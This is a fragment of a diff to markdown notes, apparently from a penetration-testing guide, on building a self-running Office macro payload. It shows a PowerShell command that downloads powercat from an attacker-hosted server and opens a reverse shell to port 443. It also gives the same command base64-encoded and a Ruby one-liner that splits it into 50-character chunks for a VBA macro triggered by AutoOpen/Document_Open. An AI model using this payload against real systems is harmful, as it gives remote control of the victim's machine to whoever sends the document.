@@ -13,15 +13,17 @@ AutoOpen and Document_Open are necssary to automatically execute our macro upon 
 
 for our payload we'll download powercat from our hosted web server and base64 it UTF16-LE
 
-  IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.x.x/powercat.ps1');powercat -c 192.168.x.x -p 443 -e powershell
+    IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.x.x/powercat.ps1');powercat -c 192.168.x.x -p 443 -e powershell
 
 we have a string size limitation so we need to split our string into length of 50
 
 ruby one liner 
   
-  payload = SUVYKE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTkyLjE2OC40NS4xNTQvcG93ZXJjYXQucHMxJyk7cG93ZXJjYXQgLWMgMTkyLjE2OC40NS4xNTQgLXAgNDQzIC1lIHBvd2Vyc2hlbGw=
+    payload = SUVYKE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTkyLjE2OC40NS4xNTQvcG93ZXJjYXQucHMxJyk7cG93ZXJjYXQgLWMgMTkyLjE2OC40NS4xNTQgLXAgNDQzIC1lIHBvd2Vyc2hlbGw=
 
-  payload.chars.each_slice(50).map(&:join).each{|arr|p "Str = Str + #{arr}"}
+  ```ruby
+payload.chars.each_slice(50).map(&:join).each{|arr|p "Str = Str + #{arr}"}
+```
   
 
 ```vb
